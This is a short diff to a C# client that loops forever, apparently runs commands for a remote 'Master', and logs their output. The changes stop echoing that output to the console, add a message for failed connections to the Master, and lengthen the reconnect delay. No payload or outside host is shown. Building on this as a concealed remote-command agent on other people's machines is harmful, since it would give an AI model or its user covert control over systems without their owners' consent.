@@ -111,6 +111,8 @@ class Client
     // Main thread
     public static void Worker()
     {
+        Show_Top_Bar();
+
         // Repeat forever (is gonna change)
         while (true)
         {
@@ -265,7 +267,7 @@ class Client
                     while (!process.HasExited)
                     {
                         cmd_output += process.StandardOutput.ReadToEnd();
-                        Console.WriteLine(cmd_output);
+                        //Console.WriteLine(cmd_output);
                     }
                     Write_Log(cmd_output);
 
@@ -376,11 +378,19 @@ class Client
                 }
                 catch (Exception e)
                 {
-                    // Log errors
-                    Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                    if (e is SocketException)
+                    {
+                        Console.WriteLine("Can't connect to Master");
+                    }
+                    else
+                    {
+                        // Log errors
+                        Console.WriteLine("Unexpected exception : {0}", e.ToString());
+                    }
+
                     Write_Log(e.ToString());
-                    // Wait for 2.5 seconds
-                    Thread.Sleep(2500);
+
+                    Thread.Sleep(10000);
                 }
             }
             catch (Exception e)
